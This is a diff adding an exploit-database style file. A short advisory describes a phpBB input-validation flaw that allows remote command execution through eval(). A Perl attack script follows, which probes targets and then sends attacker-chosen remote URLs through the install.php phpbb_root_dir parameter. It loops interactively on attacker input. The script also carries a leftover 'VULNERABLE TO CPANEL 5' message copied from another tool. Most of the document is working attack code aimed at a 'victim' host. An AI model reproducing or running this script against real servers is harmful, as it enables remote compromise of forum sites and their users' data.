@@ -1,0 +1,169 @@
+source: http://www.securityfocus.com/bid/3167/info
+
+An input validation error exists in phpBB, a freely available WWW forums package.
+
+The problem is due to improper validation of some variables in phpBB. It is possible for users registered with the phpBB system to submit values for certain variables used internally by some scripts in the package. An attacker may be able to circumvent the loading of certain values used in the package, and thus be able to submit values of his or her choice.
+
+In the 'page_header.php' script, one such variable is evaluated using PHP's eval() command. As a result, it may be possible for a remote attacker to submit values causing the execution of arbitrary commands on the system running phpBB. 
+
+#####################################################
+# Spabam 2003 PRIV8 code
+# #hackarena irc.brasnet.org
+# This Script is currently under development
+#####################################################
+use strict;
+use IO::Socket;
+my $host;
+my $port;
+my $command;
+my $url;
+my @results;
+my $probe;
+my @U;
+$U[1] = "/phpbb2/install.php?phpbb_root_dir=http://";
+&intro;
+&scan;
+&choose;
+&command;
+&exit;
+sub intro {
+&help;
+&host;
+&server;
+sleep 3;
+};
+sub host {
+print "\nHost or IP : ";
+$host=<STDIN>;
+chomp $host;
+if ($host eq ""){$host="127.0.0.1"};
+$port="80";
+chomp $port;
+if ($port =~/\D/ ){$port="80"};
+if ($port eq "" ) {$port = "80"};
+};
+sub server {
+my $X;
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+$probe = "string";
+my $output;
+my $webserver = "something";
+&connect;
+for ($X=0; $X<=10; $X++){
+	$output = $results[$X];
+	if (defined $output){
+	if ($output =~/Apache/){ $webserver = "Apache" };
+	};
+};
+if ($webserver ne "Apache"){
+my $choice = "y";
+chomp $choice;
+if ($choice =~/N/i) {&exit};
+            }else{
+print "\n\nOK";
+	};		
+};  
+sub scan {
+my $status = "not_vulnerable";
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+my $loop;
+my $output;
+my $flag;
+$command="dir";
+for ($loop=1; $loop < @U; $loop++) { 
+$flag = "0";
+$url = $U[$loop];
+$probe = "scan";
+&connect;
+foreach $output (@results){
+if ($output =~ /Directory/) {
+                              $flag = "1";
+			      $status = "vulnerable";
+			      };
+	};
+if ($flag eq "0") { 
+}else{
+print "\a\a\a\n$host VULNERABLE TO CPANEL 5 $loop !!!";
+     };
+};
+if ($status eq "not_vulnerable"){
+
+				};
+};
+sub choose {
+my $choice="0";
+chomp $choice;
+if ($choice > @U){ &choose };
+if ($choice =~/\D/g ){ &choose };
+if ($choice == 0){ &other };
+$url = $U[$choice];
+};
+sub other {
+my $other = "/phpbb2/install.php?phpbb_root_dir=http://";
+chomp $other;
+$U[0] = $other;
+};
+sub command {
+while ($command !~/quit/i) {
+print "\nWRITE YA PAGE IMAGE HERE: http://";
+$command = <STDIN>;
+chomp $command;
+if ($command =~/quit/i) { &exit };
+if ($command =~/url/i) { &choose }; 
+if ($command =~/scan/i) { &scan };
+if ($command =~/help/i) { &help };
+$command =~ s/\s/+/g; 
+$probe = "command";
+if ($command !~/quit|url|scan|help/) {&connect};
+};
+&exit;
+};  
+sub connect {
+my $connection = IO::Socket::INET->new (
+				Proto => "tcp",
+				PeerAddr => "$host",
+				PeerPort => "$port",
+				) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
+$connection -> autoflush(1);
+if ($probe =~/command|scan/){
+print $connection "GET $url$command HTTP/1.0\r\n\r\n";
+}elsif ($probe =~/string/) {
+print $connection "HEAD / HTTP/1.0\r\n\r\n";
+};
+
+while ( <$connection> ) { 
+			@results = <$connection>;
+			 };
+close $connection;
+if ($probe eq "command"){ &output };
+if ($probe eq "string"){ &output };
+};  
+sub output{
+my $display;
+if ($probe eq "string") {
+			my $X;
+			for ($X=0; $X<=10; $X++) {
+			$display = $results[$X];
+			if (defined $display){print "$display";};
+			sleep 1;
+				};
+			}else{
+			foreach $display (@results){
+			    print "$display";
+			    sleep 1;
+				};
+                          };
+};  
+sub exit{
+print "\n\n\n
+SPABAM 2003.";
+print "\n\n\n";
+exit;
+};
+sub help {
+print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
+print "\n PHPBB LAMAH EXPLOIT!!!";
+print "\n spabam make this shit..";
+print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
+print "\n\n\n\n\n\n\n\n\n\n\n\n";
+};
